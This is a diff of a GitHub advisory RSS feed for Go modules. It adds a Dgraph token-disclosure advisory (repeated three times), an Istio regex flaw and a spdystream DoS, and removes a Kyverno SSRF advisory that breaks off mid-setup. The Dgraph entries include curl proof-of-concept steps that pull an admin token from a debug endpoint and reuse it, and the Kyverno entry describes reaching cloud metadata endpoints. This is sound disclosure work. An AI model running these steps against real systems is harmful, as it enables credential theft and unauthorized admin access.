@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-04-16T20:26:32.975Z</updated>
+    <updated>2026-04-16T21:08:56.006Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,461 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/dgraph-io/dgraph] Dgraph: Unauthenticated /debug/pprof/cmdline discloses admin auth token, enabling unauthorized access to protected Alpha admin endpoints]]></title>
+        <id>https://github.com/advisories/GHSA-95mq-xwj4-r47p</id>
+        <link href="https://github.com/advisories/GHSA-95mq-xwj4-r47p"/>
+        <updated>2026-04-16T21:08:08.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An unauthenticated debug endpoint in Dgraph Alpha exposes the full process command line, including the configured admin token from <code>--security "token=..."</code>.</p>
+<p>This does not break token validation logic directly; instead, it discloses the credential and enables unauthorized admin-level access by reusing the leaked token in <code>X-Dgraph-AuthToken</code>.</p>
+<h3 id="details">Details</h3>
+<p>The behavior occurs entirely within core Alpha HTTP routing and does not require any external proxy, plugin, or non-core integration.</p>
+<p>The core issue is not that admin token protection is absent, but that the protected secret is exposed in cleartext through an unauthenticated core debug endpoint.</p>
+<p>Relevant code paths:</p>
+<ul>
+<li><code>dgraph/cmd/alpha/run.go:17</code> imports <code>net/http/pprof</code>, which registers <code>/debug/pprof/*</code> handlers on the default mux.</li>
+<li><code>dgraph/cmd/alpha/run.go:533</code> uses <code>http.Handle("/", audit.AuditRequestHttp(baseMux))</code>, so default-mux handlers remain reachable.</li>
+<li><code>dgraph/cmd/alpha/admin.go:52</code> enforces admin token checks in <code>adminAuthHandler</code> for admin endpoints.</li>
+<li><code>dgraph/cmd/alpha/admin.go:74</code> shows <code>/admin/config/cache_mb</code> behind <code>adminAuthHandler</code>.</li>
+</ul>
+<p>Credential-exposure chain:</p>
+<ol>
+<li><code>/debug/pprof/cmdline</code> is reachable without authentication.</li>
+<li>Its output includes the configured admin token from process arguments.</li>
+<li>The disclosed token is accepted by <code>adminAuthHandler</code> when sent as <code>X-Dgraph-AuthToken</code>.</li>
+<li>An attacker gains unauthorized access to admin-only functionality.</li>
+</ol>
+<p>Observed local evidence (safe validation):</p>
+<ul>
+<li>Request: <code>GET /admin/config/cache_mb</code> without token<ul>
+<li>Status: 200 (request rejected at application layer)</li>
+<li>Body contains error: <code>Invalid X-Dgraph-AuthToken</code></li>
+<li>The endpoint returns HTTP 200 but indicates authentication failure in the response body.</li>
+</ul>
+</li>
+<li>Request: <code>GET /debug/pprof/cmdline</code> without token<ul>
+<li>Status: 200</li>
+<li>Body excerpt includes: <code>--security=token=TopSecretToken123;</code></li>
+</ul>
+</li>
+<li>Request: <code>GET /admin/config/cache_mb</code> with <code>X-Dgraph-AuthToken: TopSecretToken123</code><ul>
+<li>Status: 200</li>
+<li>Body: <code>4096</code></li>
+</ul>
+</li>
+</ul>
+<p>Important policy/triage clarification:</p>
+<ul>
+<li>This issue persists even when the admin-token security feature is enabled: the token itself is exposed via an unauthenticated core debug endpoint, making this more than a misconfiguration-only concern.</li>
+<li>Network restrictions (bind/whitelist/firewall) may reduce exposure, but they do not remediate the underlying credential disclosure behavior.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<ul>
+<li>Branch: <code>main</code></li>
+<li>Commit: <code>b15c87e93</code></li>
+<li>Describe: <code>v25.3.1</code></li>
+</ul>
+<p>Preconditions:</p>
+<ul>
+<li>Alpha HTTP port is reachable by attacker traffic.</li>
+<li>Admin token is configured via supported startup flag: <code>--security "token=..."</code>.</li>
+<li><code>/debug/pprof/*</code> is exposed on the same Alpha HTTP listener.</li>
+<li>This behavior occurs with documented startup flags and without any non-default or unsupported configuration.</li>
+</ul>
+<p>Reproduction steps:</p>
+<ol>
+<li><p>Start Zero and Alpha (example local setup):</p>
+<ul>
+<li><code>dgraph zero --my=127.0.0.1:5280 --port_offset=200 --bindall=false --wal=./zw</code></li>
+<li><code>dgraph alpha --my=127.0.0.1:7280 --zero=127.0.0.1:5280 --port_offset=200 --bindall=false --security "token=TopSecretToken123;" --postings=./p --wal=./w --tmp=./t</code></li>
+</ul>
+</li>
+<li><p>Verify admin endpoint rejects unauthenticated request:</p>
+<ul>
+<li><code>curl -i http://127.0.0.1:8280/admin/config/cache_mb</code></li>
+<li>Expected body includes <code>Invalid X-Dgraph-AuthToken</code>.</li>
+</ul>
+</li>
+<li><p>Read token from unauthenticated debug endpoint:</p>
+<ul>
+<li><code>curl -s http://127.0.0.1:8280/debug/pprof/cmdline</code></li>
+<li>Expected output includes <code>--security=token=TopSecretToken123;</code>.</li>
+</ul>
+</li>
+<li><p>Reuse leaked token against admin endpoint:</p>
+<ul>
+<li><code>curl -i -H "X-Dgraph-AuthToken: TopSecretToken123" http://127.0.0.1:8280/admin/config/cache_mb</code></li>
+<li>Expected: successful response (example observed: <code>4096</code>).</li>
+</ul>
+</li>
+</ol>
+<p>Note: The PoC uses <code>127.0.0.1</code> only for safe local validation. The vulnerable condition is unauthenticated reachability of <code>/debug/pprof/cmdline</code>; in any deployment where Alpha HTTP is reachable by untrusted parties, the same token disclosure and subsequent unauthorized admin access apply.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Unauthenticated disclosure of a sensitive admin credential via debug endpoint, enabling unauthorized privileged administrative access through token reuse</li>
+<li>Operators running Dgraph Alpha with admin token configured, where Alpha HTTP/debug routes are reachable by untrusted users or networks.</li>
+</ul>
+<p>The attack requires network reachability to the Alpha HTTP port. In deployments where this interface is exposed beyond trusted boundaries, the issue is remotely exploitable without authentication.</p>
+<p>Depending on exposed admin functionality in deployment policy, this may allow configuration changes, operational control actions, and other privileged administrative operations exposed through <code>/admin/*</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dgraph-io/dgraph/security/advisories/GHSA-95mq-xwj4-r47p">https://github.com/dgraph-io/dgraph/security/advisories/GHSA-95mq-xwj4-r47p</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40173">https://nvd.nist.gov/vuln/detail/CVE-2026-40173</a></li>
+<li><a href="https://github.com/dgraph-io/dgraph/releases/tag/v25.3.2">https://github.com/dgraph-io/dgraph/releases/tag/v25.3.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-95mq-xwj4-r47p">https://github.com/advisories/GHSA-95mq-xwj4-r47p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-95mq-xwj4-r47p</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-16T21:08:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/dgraph-io/dgraph/v24] Dgraph: Unauthenticated /debug/pprof/cmdline discloses admin auth token, enabling unauthorized access to protected Alpha admin endpoints]]></title>
+        <id>https://github.com/advisories/GHSA-95mq-xwj4-r47p</id>
+        <link href="https://github.com/advisories/GHSA-95mq-xwj4-r47p"/>
+        <updated>2026-04-16T21:08:08.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An unauthenticated debug endpoint in Dgraph Alpha exposes the full process command line, including the configured admin token from <code>--security "token=..."</code>.</p>
+<p>This does not break token validation logic directly; instead, it discloses the credential and enables unauthorized admin-level access by reusing the leaked token in <code>X-Dgraph-AuthToken</code>.</p>
+<h3 id="details">Details</h3>
+<p>The behavior occurs entirely within core Alpha HTTP routing and does not require any external proxy, plugin, or non-core integration.</p>
+<p>The core issue is not that admin token protection is absent, but that the protected secret is exposed in cleartext through an unauthenticated core debug endpoint.</p>
+<p>Relevant code paths:</p>
+<ul>
+<li><code>dgraph/cmd/alpha/run.go:17</code> imports <code>net/http/pprof</code>, which registers <code>/debug/pprof/*</code> handlers on the default mux.</li>
+<li><code>dgraph/cmd/alpha/run.go:533</code> uses <code>http.Handle("/", audit.AuditRequestHttp(baseMux))</code>, so default-mux handlers remain reachable.</li>
+<li><code>dgraph/cmd/alpha/admin.go:52</code> enforces admin token checks in <code>adminAuthHandler</code> for admin endpoints.</li>
+<li><code>dgraph/cmd/alpha/admin.go:74</code> shows <code>/admin/config/cache_mb</code> behind <code>adminAuthHandler</code>.</li>
+</ul>
+<p>Credential-exposure chain:</p>
+<ol>
+<li><code>/debug/pprof/cmdline</code> is reachable without authentication.</li>
+<li>Its output includes the configured admin token from process arguments.</li>
+<li>The disclosed token is accepted by <code>adminAuthHandler</code> when sent as <code>X-Dgraph-AuthToken</code>.</li>
+<li>An attacker gains unauthorized access to admin-only functionality.</li>
+</ol>
+<p>Observed local evidence (safe validation):</p>
+<ul>
+<li>Request: <code>GET /admin/config/cache_mb</code> without token<ul>
+<li>Status: 200 (request rejected at application layer)</li>
+<li>Body contains error: <code>Invalid X-Dgraph-AuthToken</code></li>
+<li>The endpoint returns HTTP 200 but indicates authentication failure in the response body.</li>
+</ul>
+</li>
+<li>Request: <code>GET /debug/pprof/cmdline</code> without token<ul>
+<li>Status: 200</li>
+<li>Body excerpt includes: <code>--security=token=TopSecretToken123;</code></li>
+</ul>
+</li>
+<li>Request: <code>GET /admin/config/cache_mb</code> with <code>X-Dgraph-AuthToken: TopSecretToken123</code><ul>
+<li>Status: 200</li>
+<li>Body: <code>4096</code></li>
+</ul>
+</li>
+</ul>
+<p>Important policy/triage clarification:</p>
+<ul>
+<li>This issue persists even when the admin-token security feature is enabled: the token itself is exposed via an unauthenticated core debug endpoint, making this more than a misconfiguration-only concern.</li>
+<li>Network restrictions (bind/whitelist/firewall) may reduce exposure, but they do not remediate the underlying credential disclosure behavior.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<ul>
+<li>Branch: <code>main</code></li>
+<li>Commit: <code>b15c87e93</code></li>
+<li>Describe: <code>v25.3.1</code></li>
+</ul>
+<p>Preconditions:</p>
+<ul>
+<li>Alpha HTTP port is reachable by attacker traffic.</li>
+<li>Admin token is configured via supported startup flag: <code>--security "token=..."</code>.</li>
+<li><code>/debug/pprof/*</code> is exposed on the same Alpha HTTP listener.</li>
+<li>This behavior occurs with documented startup flags and without any non-default or unsupported configuration.</li>
+</ul>
+<p>Reproduction steps:</p>
+<ol>
+<li><p>Start Zero and Alpha (example local setup):</p>
+<ul>
+<li><code>dgraph zero --my=127.0.0.1:5280 --port_offset=200 --bindall=false --wal=./zw</code></li>
+<li><code>dgraph alpha --my=127.0.0.1:7280 --zero=127.0.0.1:5280 --port_offset=200 --bindall=false --security "token=TopSecretToken123;" --postings=./p --wal=./w --tmp=./t</code></li>
+</ul>
+</li>
+<li><p>Verify admin endpoint rejects unauthenticated request:</p>
+<ul>
+<li><code>curl -i http://127.0.0.1:8280/admin/config/cache_mb</code></li>
+<li>Expected body includes <code>Invalid X-Dgraph-AuthToken</code>.</li>
+</ul>
+</li>
+<li><p>Read token from unauthenticated debug endpoint:</p>
+<ul>
+<li><code>curl -s http://127.0.0.1:8280/debug/pprof/cmdline</code></li>
+<li>Expected output includes <code>--security=token=TopSecretToken123;</code>.</li>
+</ul>
+</li>
+<li><p>Reuse leaked token against admin endpoint:</p>
+<ul>
+<li><code>curl -i -H "X-Dgraph-AuthToken: TopSecretToken123" http://127.0.0.1:8280/admin/config/cache_mb</code></li>
+<li>Expected: successful response (example observed: <code>4096</code>).</li>
+</ul>
+</li>
+</ol>
+<p>Note: The PoC uses <code>127.0.0.1</code> only for safe local validation. The vulnerable condition is unauthenticated reachability of <code>/debug/pprof/cmdline</code>; in any deployment where Alpha HTTP is reachable by untrusted parties, the same token disclosure and subsequent unauthorized admin access apply.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Unauthenticated disclosure of a sensitive admin credential via debug endpoint, enabling unauthorized privileged administrative access through token reuse</li>
+<li>Operators running Dgraph Alpha with admin token configured, where Alpha HTTP/debug routes are reachable by untrusted users or networks.</li>
+</ul>
+<p>The attack requires network reachability to the Alpha HTTP port. In deployments where this interface is exposed beyond trusted boundaries, the issue is remotely exploitable without authentication.</p>
+<p>Depending on exposed admin functionality in deployment policy, this may allow configuration changes, operational control actions, and other privileged administrative operations exposed through <code>/admin/*</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dgraph-io/dgraph/security/advisories/GHSA-95mq-xwj4-r47p">https://github.com/dgraph-io/dgraph/security/advisories/GHSA-95mq-xwj4-r47p</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40173">https://nvd.nist.gov/vuln/detail/CVE-2026-40173</a></li>
+<li><a href="https://github.com/dgraph-io/dgraph/releases/tag/v25.3.2">https://github.com/dgraph-io/dgraph/releases/tag/v25.3.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-95mq-xwj4-r47p">https://github.com/advisories/GHSA-95mq-xwj4-r47p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-95mq-xwj4-r47p</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-16T21:08:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/dgraph-io/dgraph/v25] Dgraph: Unauthenticated /debug/pprof/cmdline discloses admin auth token, enabling unauthorized access to protected Alpha admin endpoints]]></title>
+        <id>https://github.com/advisories/GHSA-95mq-xwj4-r47p</id>
+        <link href="https://github.com/advisories/GHSA-95mq-xwj4-r47p"/>
+        <updated>2026-04-16T21:08:08.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An unauthenticated debug endpoint in Dgraph Alpha exposes the full process command line, including the configured admin token from <code>--security "token=..."</code>.</p>
+<p>This does not break token validation logic directly; instead, it discloses the credential and enables unauthorized admin-level access by reusing the leaked token in <code>X-Dgraph-AuthToken</code>.</p>
+<h3 id="details">Details</h3>
+<p>The behavior occurs entirely within core Alpha HTTP routing and does not require any external proxy, plugin, or non-core integration.</p>
+<p>The core issue is not that admin token protection is absent, but that the protected secret is exposed in cleartext through an unauthenticated core debug endpoint.</p>
+<p>Relevant code paths:</p>
+<ul>
+<li><code>dgraph/cmd/alpha/run.go:17</code> imports <code>net/http/pprof</code>, which registers <code>/debug/pprof/*</code> handlers on the default mux.</li>
+<li><code>dgraph/cmd/alpha/run.go:533</code> uses <code>http.Handle("/", audit.AuditRequestHttp(baseMux))</code>, so default-mux handlers remain reachable.</li>
+<li><code>dgraph/cmd/alpha/admin.go:52</code> enforces admin token checks in <code>adminAuthHandler</code> for admin endpoints.</li>
+<li><code>dgraph/cmd/alpha/admin.go:74</code> shows <code>/admin/config/cache_mb</code> behind <code>adminAuthHandler</code>.</li>
+</ul>
+<p>Credential-exposure chain:</p>
+<ol>
+<li><code>/debug/pprof/cmdline</code> is reachable without authentication.</li>
+<li>Its output includes the configured admin token from process arguments.</li>
+<li>The disclosed token is accepted by <code>adminAuthHandler</code> when sent as <code>X-Dgraph-AuthToken</code>.</li>
+<li>An attacker gains unauthorized access to admin-only functionality.</li>
+</ol>
+<p>Observed local evidence (safe validation):</p>
+<ul>
+<li>Request: <code>GET /admin/config/cache_mb</code> without token<ul>
+<li>Status: 200 (request rejected at application layer)</li>
+<li>Body contains error: <code>Invalid X-Dgraph-AuthToken</code></li>
+<li>The endpoint returns HTTP 200 but indicates authentication failure in the response body.</li>
+</ul>
+</li>
+<li>Request: <code>GET /debug/pprof/cmdline</code> without token<ul>
+<li>Status: 200</li>
+<li>Body excerpt includes: <code>--security=token=TopSecretToken123;</code></li>
+</ul>
+</li>
+<li>Request: <code>GET /admin/config/cache_mb</code> with <code>X-Dgraph-AuthToken: TopSecretToken123</code><ul>
+<li>Status: 200</li>
+<li>Body: <code>4096</code></li>
+</ul>
+</li>
+</ul>
+<p>Important policy/triage clarification:</p>
+<ul>
+<li>This issue persists even when the admin-token security feature is enabled: the token itself is exposed via an unauthenticated core debug endpoint, making this more than a misconfiguration-only concern.</li>
+<li>Network restrictions (bind/whitelist/firewall) may reduce exposure, but they do not remediate the underlying credential disclosure behavior.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<ul>
+<li>Branch: <code>main</code></li>
+<li>Commit: <code>b15c87e93</code></li>
+<li>Describe: <code>v25.3.1</code></li>
+</ul>
+<p>Preconditions:</p>
+<ul>
+<li>Alpha HTTP port is reachable by attacker traffic.</li>
+<li>Admin token is configured via supported startup flag: <code>--security "token=..."</code>.</li>
+<li><code>/debug/pprof/*</code> is exposed on the same Alpha HTTP listener.</li>
+<li>This behavior occurs with documented startup flags and without any non-default or unsupported configuration.</li>
+</ul>
+<p>Reproduction steps:</p>
+<ol>
+<li><p>Start Zero and Alpha (example local setup):</p>
+<ul>
+<li><code>dgraph zero --my=127.0.0.1:5280 --port_offset=200 --bindall=false --wal=./zw</code></li>
+<li><code>dgraph alpha --my=127.0.0.1:7280 --zero=127.0.0.1:5280 --port_offset=200 --bindall=false --security "token=TopSecretToken123;" --postings=./p --wal=./w --tmp=./t</code></li>
+</ul>
+</li>
+<li><p>Verify admin endpoint rejects unauthenticated request:</p>
+<ul>
+<li><code>curl -i http://127.0.0.1:8280/admin/config/cache_mb</code></li>
+<li>Expected body includes <code>Invalid X-Dgraph-AuthToken</code>.</li>
+</ul>
+</li>
+<li><p>Read token from unauthenticated debug endpoint:</p>
+<ul>
+<li><code>curl -s http://127.0.0.1:8280/debug/pprof/cmdline</code></li>
+<li>Expected output includes <code>--security=token=TopSecretToken123;</code>.</li>
+</ul>
+</li>
+<li><p>Reuse leaked token against admin endpoint:</p>
+<ul>
+<li><code>curl -i -H "X-Dgraph-AuthToken: TopSecretToken123" http://127.0.0.1:8280/admin/config/cache_mb</code></li>
+<li>Expected: successful response (example observed: <code>4096</code>).</li>
+</ul>
+</li>
+</ol>
+<p>Note: The PoC uses <code>127.0.0.1</code> only for safe local validation. The vulnerable condition is unauthenticated reachability of <code>/debug/pprof/cmdline</code>; in any deployment where Alpha HTTP is reachable by untrusted parties, the same token disclosure and subsequent unauthorized admin access apply.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Unauthenticated disclosure of a sensitive admin credential via debug endpoint, enabling unauthorized privileged administrative access through token reuse</li>
+<li>Operators running Dgraph Alpha with admin token configured, where Alpha HTTP/debug routes are reachable by untrusted users or networks.</li>
+</ul>
+<p>The attack requires network reachability to the Alpha HTTP port. In deployments where this interface is exposed beyond trusted boundaries, the issue is remotely exploitable without authentication.</p>
+<p>Depending on exposed admin functionality in deployment policy, this may allow configuration changes, operational control actions, and other privileged administrative operations exposed through <code>/admin/*</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dgraph-io/dgraph/security/advisories/GHSA-95mq-xwj4-r47p">https://github.com/dgraph-io/dgraph/security/advisories/GHSA-95mq-xwj4-r47p</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40173">https://nvd.nist.gov/vuln/detail/CVE-2026-40173</a></li>
+<li><a href="https://github.com/dgraph-io/dgraph/releases/tag/v25.3.2">https://github.com/dgraph-io/dgraph/releases/tag/v25.3.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-95mq-xwj4-r47p">https://github.com/advisories/GHSA-95mq-xwj4-r47p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-95mq-xwj4-r47p</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-16T21:08:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[istio.io/istio] Istio: AuthorizationPolicy serviceAccounts regex injection via unescaped dots]]></title>
+        <id>https://github.com/advisories/GHSA-9gcg-w975-3rjh</id>
+        <link href="https://github.com/advisories/GHSA-9gcg-w975-3rjh"/>
+        <updated>2026-04-16T20:44:48.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>The <code>serviceAccounts</code> and <code>notServiceAccounts</code> fields in AuthorizationPolicy incorrectly interpret dots (<code>.</code>) as a regular expression matcher. Because <code>.</code> is a valid character in a service account name, an <code>AuthorizationPolicy</code> ALLOW rule targeting SA e.g. <code>cert-manager.io</code> also matches <code>cert-manager-io</code>, <code>cert-managerXio</code>, etc. A DENY rule targeting the same name fails to block those variants.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixes are available in 1.29.2, 1.28.6, and 1.27.9</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>None</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/istio/istio/security/advisories/GHSA-9gcg-w975-3rjh">https://github.com/istio/istio/security/advisories/GHSA-9gcg-w975-3rjh</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39350">https://nvd.nist.gov/vuln/detail/CVE-2026-39350</a></li>
+<li><a href="https://github.com/istio/istio/commit/692e460c342d8f308a35b6ecbdace47807da8ade">https://github.com/istio/istio/commit/692e460c342d8f308a35b6ecbdace47807da8ade</a></li>
+<li><a href="https://github.com/advisories/GHSA-9gcg-w975-3rjh">https://github.com/advisories/GHSA-9gcg-w975-3rjh</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9gcg-w975-3rjh</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-04-16T20:44:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/moby/spdystream] SpdyStream: DOS on CRI]]></title>
+        <id>https://github.com/advisories/GHSA-pc3f-x583-g7j2</id>
+        <link href="https://github.com/advisories/GHSA-pc3f-x583-g7j2"/>
+        <updated>2026-04-16T20:44:03.000Z</updated>
+        <content type="html"><![CDATA[<p>The SPDY/3 frame parser in spdystream does not validate
+attacker-controlled counts and lengths before allocating memory. A
+remote peer that can send SPDY frames to a service using spdystream can
+cause the process to allocate gigabytes of memory with a small number of
+malformed control frames, leading to an out-of-memory crash.
+&nbsp;
+Three allocation paths in the receive side are affected:</p>
+<ol>
+<li><strong>SETTINGS entry count</strong> -- The SETTINGS frame reader reads a 32-bit
+<code>numSettings</code> from the payload and allocates a slice of that size
+without checking it against the declared frame length. An attacker
+can set <code>numSettings</code> to a value far exceeding the actual payload,
+triggering a large allocation before any setting data is read.</li>
+<li><strong>Header count</strong> -- <code>parseHeaderValueBlock</code> reads a 32-bit
+<code>numHeaders</code> from the decompressed header block and allocates an
+<code>http.Header</code> map of that size with no upper bound.</li>
+<li><strong>Header field size</strong> -- Individual header name and value lengths are
+read as 32-bit integers and used directly as allocation sizes with
+no validation.</li>
+</ol>
+<p>&nbsp;
+Because SPDY header blocks are zlib-compressed, a small on-the-wire
+payload can decompress into attacker-controlled bytes that the parser
+interprets as 32-bit counts and lengths. A single crafted frame is
+enough to exhaust process memory.</p>
+<h2 id="impact">Impact</h2>
+<p>&nbsp;Any program that accepts SPDY connections using spdystream -- directly
+or through a dependent library -- is affected. A remote peer that can
+send SPDY frames to the service can crash the process with a single
+crafted SPDY control frame, causing denial of service.</p>
+<h2 id="affected-versions">Affected versions</h2>
+<p>&nbsp;<code>github.com/moby/spdystream</code> &lt;= v0.5.0</p>
+<h2 id="fix">Fix</h2>
+<p>&nbsp;v0.5.1 addresses the receive-side allocation bugs and adds related
+hardening:
+&nbsp;
+<strong>Core fixes:</strong>
+&nbsp;</p>
+<ul>
+<li><strong>SETTINGS entry-count validation</strong> -- The SETTINGS frame reader now
+checks that <code>numSettings</code> is consistent with the declared frame
+length (<code>numSettings &lt;= (length-4)/8</code>) before allocating.</li>
+<li><strong>Header count limit</strong> -- <code>parseHeaderValueBlock</code> enforces a maximum
+number of headers per frame (default: 1000).</li>
+<li><strong>Header field size limit</strong> -- Individual header name and value
+lengths are checked against a per-field size limit (default: 1 MiB)
+before allocation.</li>
+<li><strong>Connection closure on protocol error</strong> -- The connection read loop
+now closes the underlying <code>net.Conn</code> when it encounters an
+<code>InvalidControlFrame</code> error, preventing further exploitation on the
+same connection.</li>
+</ul>
+<p>&nbsp;
+<strong>Additional hardening:</strong>
+&nbsp;</p>
+<ul>
+<li><strong>Write-side bounds checks</strong> -- All frame write methods now verify
+that payloads fit within the 24-bit length field, preventing the
+library from producing invalid frames.</li>
+</ul>
+<p>&nbsp;
+<strong>Configurable limits:</strong>
+&nbsp;</p>
+<ul>
+<li>Callers can adjust the defaults using <code>NewConnectionWithOptions</code> or
+the lower-level <code>spdy.NewFramerWithOptions</code> with functional options:
+<code>WithMaxControlFramePayloadSize</code>, <code>WithMaxHeaderFieldSize</code>, and
+<code>WithMaxHeaderCount</code>.</li>
+</ul>
+<p>&nbsp;</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/moby/spdystream/security/advisories/GHSA-pc3f-x583-g7j2">https://github.com/moby/spdystream/security/advisories/GHSA-pc3f-x583-g7j2</a></li>
+<li><a href="https://github.com/advisories/GHSA-pc3f-x583-g7j2">https://github.com/advisories/GHSA-pc3f-x583-g7j2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pc3f-x583-g7j2</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-16T20:44:01.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/oauth2-proxy/oauth2-proxy/v7] OAuth2 Proxy has an Authentication Bypass via Fragment Confusion in skip_auth_routes and skip_auth_regex]]></title>
         <id>https://github.com/advisories/GHSA-pxq7-h93f-9jrg</id>
@@ -985,391 +1440,5 @@ func main() {
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-04-14T22:38:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/kyverno/kyverno] Kyverno has SSRF via CEL http.Get/http.Post in NamespacedValidatingPolicy allows cross-namespace data access]]></title>
-        <id>https://github.com/advisories/GHSA-rggm-jjmc-3394</id>
-        <link href="https://github.com/advisories/GHSA-rggm-jjmc-3394"/>
-        <updated>2026-04-14T22:37:21.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>A Server-Side Request Forgery (SSRF) vulnerability in Kyverno's CEL HTTP library (<code>pkg/cel/libs/http/</code>) allows users with namespace-scoped policy creation permissions to make arbitrary HTTP requests from the Kyverno admission controller. This enables unauthorized access to internal services in other namespaces, cloud metadata endpoints (169.254.169.254), and data exfiltration via policy error messages.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<ul>
-<li>Kyverno &gt;= 1.16.0 (with <code>policies.kyverno.io</code> CRDs enabled, which is the default)</li>
-<li>Tested on: Kyverno v1.16.2 (Helm chart 3.6.2)</li>
-</ul>
-<h2 id="details">Details</h2>
-<p>The <code>http.Get()</code> and <code>http.Post()</code> functions available in CEL-based policies (<code>policies.kyverno.io</code> API group) do not enforce any URL restrictions. Unlike <code>resource.Lib</code> which enforces namespace boundaries for namespaced policies, the <code>http.Lib</code> allows unrestricted access to any URL.</p>
-<p><strong>Vulnerable Code:</strong> <code>pkg/cel/libs/http/http.go</code></p>
-<pre><code class="language-go">func (r *contextImpl) Get(url string, headers map[string]string) (any, error) {
-    req, err := http.NewRequestWithContext(context.TODO(), "GET", url, nil)
-    // NO URL VALIDATION - no blocklist, no namespace restrictions
-    ...
-}
-</code></pre>
-<p><strong>Contrast with resource.Lib</strong> which enforces namespace:</p>
-<pre><code class="language-go">// pkg/cel/libs/resource/lib.go
-func Lib(namespace string, v *version.Version) cel.EnvOption {
-    return cel.Lib(&amp;lib{namespace: namespace, version: v})  // Namespace enforced
-}
-</code></pre>
-<p>This is a <strong>different code path</strong> from previously reported issues:</p>
-<ul>
-<li>GHSA-8p9x-46gm-qfx2: <code>pkg/engine/apicall/apiCall.go</code> (URLPath) - Fixed</li>
-<li>GHSA-459x-q9hg-4gpq: <code>pkg/engine/apicall/executor.go</code> (Service.URL) - Different feature (apiCall vs CEL http)</li>
-<li><strong>This issue</strong>: <code>pkg/cel/libs/http/http.go</code> (CEL http.Get/http.Post) - <strong>Not fixed</strong></li>
-</ul>
-<h2 id="poc">PoC</h2>
-<p>Tested on Kyverno v1.16.2 (Chart 3.6.2) on Kubernetes v1.35.0 (kind).</p>
-<p>A complete automated PoC script is attached. Manual steps below:</p>
-<h3 id="1-setup-attacker-with-namespace-scoped-permissions">1. Setup attacker with namespace-scoped permissions</h3>
-<pre><code class="language-bash">kubectl create namespace attacker-ns
-kubectl create serviceaccount namespace-admin -n attacker-ns
-
-cat &lt;&lt;EOF | kubectl apply -f -
-apiVersion: rbac.authorization.k8s.io/v1
-kind: Role
-metadata:
-  name: namespace-admin-role
-  namespace: attacker-ns
-rules:
-  - apiGroups: [""]
-    resources: ["configmaps"]
-    verbs: ["create", "get", "list"]
-  - apiGroups: ["policies.kyverno.io"]
-    resources: ["namespacedvalidatingpolicies"]
-    verbs: ["create", "get", "list"]
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: RoleBinding
-metadata:
-  name: namespace-admin-binding
-  namespace: attacker-ns
-subjects:
-  - kind: ServiceAccount
-    name: namespace-admin
-    namespace: attacker-ns
-roleRef:
-  kind: Role
-  name: namespace-admin-role
-  apiGroup: rbac.authorization.k8s.io
